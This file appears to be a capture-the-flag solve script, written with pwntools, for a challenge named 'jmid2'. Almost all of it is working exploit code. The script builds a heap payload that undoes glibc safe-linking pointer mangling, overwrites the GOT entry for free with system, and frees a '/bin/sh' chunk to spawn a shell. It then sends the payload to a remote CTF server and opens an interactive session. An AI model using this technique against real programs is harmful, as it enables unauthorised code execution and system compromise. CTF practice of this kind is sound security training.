import gen
from pwn import *

# Solve script for jmid2 written by ripsquid
# It is a bit chance-based against remote, unsure why.


eight = bytes([0x7E, 0xC3, 0xC3, 0x7E, 0xC3, 0xC3, 0x7E, 0x00])
KEY = 6
CIPHER = 1
gen.copy(0, eight)
gen.copy(1, eight)
gen.copy(2, eight)
gen.copy(3, bytes([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]))
gen.copy(4, p64(0xFFF0000000000000))
gen.copy(5, p64(0))
gen.copy(6, eight)
gen.copy(7, eight)
gen.copy(8, eight)
got_free = 0x405000
gen.copy(9, p64(got_free))
gen.copy(10, p64(0xFFFFFFFFFFFFF000))
gen.copy(11, b"/bin/sh\x00")
gen.copy(12, p64(0x2C0))

# free seg[0]
gen.delete(0)
gen.delete(1)
gen.delete(2)

# seg[1] contains a safe-linked ptr to seg[0]

# int bits = 64 - 12 * i;
# 52, 40, 28, 16, 4, 0

gen.xor(KEY, 5, 1)
gen.and_(KEY, KEY, 4)  # replicate (>> 52) << 52
gen.not_(7, 5)  # 7 = 0x000FFFFFFFFFFFFF
gen.rot(KEY, KEY, 12)
gen.and_(KEY, KEY, 7)

gen.xor(KEY, KEY, CIPHER)
gen.xor(8, 4, 5)  # copy 4 -> 8
gen.rot(8, 8, 12)
gen.or_(4, 8, 4)
gen.and_(KEY, KEY, 4)  # replicate (>> 40) << 40
gen.rot(KEY, KEY, 12)
gen.and_(KEY, KEY, 7)

gen.xor(KEY, KEY, CIPHER)
gen.rot(8, 8, 12)
gen.or_(4, 8, 4)
gen.and_(KEY, KEY, 4)
gen.rot(KEY, KEY, 12)
gen.and_(KEY, KEY, 7)

gen.xor(KEY, KEY, CIPHER)
gen.rot(8, 8, 12)
gen.or_(4, 8, 4)
gen.and_(KEY, KEY, 4)
gen.rot(KEY, KEY, 12)
gen.and_(KEY, KEY, 7)

gen.xor(KEY, KEY, CIPHER)
gen.rot(8, 8, 12)
gen.or_(4, 8, 4)
gen.and_(KEY, KEY, 4)

PLAIN = KEY

gen.rot(10, 10, 12)
gen.rot(KEY, KEY, 12)
gen.and_(KEY, KEY, 10)
gen.xor(1, KEY, 1)
gen.rot(10, 10, 64 - 12)
gen.and_(1, 1, 10)
gen.or_(1, 1, 12)
gen.xor(1, 1, KEY)

# f5a00 (xor between system and free)
gen.copy(12, p64(0xF5A00))
gen.copy(13, p64(u64(b"/bin/sh\00")))
gen.copy(14, p64(0x405000))

gen.xor(0, 12, 0)

gen.delete(
    11
)  # delete /bin/sh (overwriting free to be system, hence calling system("/bin/sh"))

len_extra = (0x200 - len(gen.data)) // 3

for _ in range(len_extra):
    gen.or_(5, 5, 5)

payload = gen.data
info(len(payload))
hex_str = payload.hex()


# p = process("./a.out.patched")
# p = gdb.debug(["./a.out.patched"])
p = remote("jmid2.ctf.wales", 1337)

p.recvuntil(b"What is the length of your image data: \n")
p.sendline(str(len(payload)).encode())

p.recvuntil(b": ")
p.sendline(hex_str.encode())

p.interactive()
